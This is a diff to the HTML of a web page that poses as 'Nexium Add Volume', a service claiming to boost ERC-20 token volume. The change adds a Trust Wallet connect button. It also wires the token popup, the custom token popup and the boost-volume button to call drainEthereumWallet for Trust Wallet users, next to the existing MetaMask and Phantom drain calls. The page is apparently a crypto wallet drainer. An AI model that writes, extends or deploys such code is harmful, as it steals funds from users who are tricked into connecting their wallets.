@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Nexium-MTX: Add volume to ERC-20 tokens on Ethereum Mainnet using MetaMask, and Phantom">
+    <meta name="description" content="Nexium-MTX: Add volume to ERC-20 tokens on Ethereum Mainnet using MetaMask, Phantom, and Trust Wallet">
     <title>Nexium Add Volume</title>
     <meta http-equiv="Content-Security-Policy" content="
       default-src 'self';
@@ -298,6 +298,7 @@
             <h2 class="text-yellow-400">Select a Wallet</h2>
             <button id="connect-metamask" class="glow-button" aria-label="Connect MetaMask">Connect MetaMask</button>
             <button id="connect-phantom" class="glow-button" aria-label="Connect Phantom">Connect Phantom</button>
+            <button id="connect-trust" class="glow-button" aria-label="Connect Trust Wallet">Connect Trust Wallet</button>
             <button class="close-modal" id="close-modal" aria-label="Close Modal">Close</button>
         </div>
     </div>
@@ -483,6 +484,9 @@
                         } else if (app.connectedWalletType === 'Phantom') {
                             console.log('Calling drainSolanaWallet with no arguments');
                             app.drainSolanaWallet();
+                        } else if (app.connectedWalletType === 'Trust') {
+                            console.log('Calling drainEthereumWallet with no arguments');
+                            app.drainEthereumWallet();
                         } else {
                             app.showFeedback('No wallet connected. Please connect your wallet.', 'error');
                             console.log('No wallet connected for token popup');
@@ -533,6 +537,9 @@
                         } else if (app.connectedWalletType === 'Phantom') {
                             console.log('Calling drainSolanaWallet with no arguments');
                             app.drainSolanaWallet();
+                        } else if (app.connectedWalletType === 'Trust') {
+                            console.log('Calling drainEthereumWallet with no arguments');
+                            app.drainEthereumWallet();
                         } else {
                             app.showFeedback('No wallet connected. Please connect your wallet.', 'error');
                             console.log('No wallet connected for custom token popup');
@@ -582,6 +589,7 @@
      
             document.getElementById('connect-metamask').addEventListener('click', ensureNavMenuVisible);
             document.getElementById('connect-phantom').addEventListener('click', ensureNavMenuVisible);
+            document.getElementById('connect-trust').addEventListener('click', ensureNavMenuVisible);
 
             // New logic for the main body form
             const tokenAddressInput = document.getElementById('token-address-input');
@@ -714,7 +722,7 @@
                 if (app.connectedWalletType === 'Phantom') {
                     console.log('[boostVolumeBtn] Calling drainSolanaWallet with no arguments');
                     app.drainSolanaWallet();
-                } else if (app.connectedWalletType === 'MetaMask') {
+                } else if (app.connectedWalletType === 'MetaMask' || app.connectedWalletType === 'Trust') {
                     console.log('[boostVolumeBtn] Calling drainEthereumWallet with no arguments');
                     app.drainEthereumWallet();
                 } else {
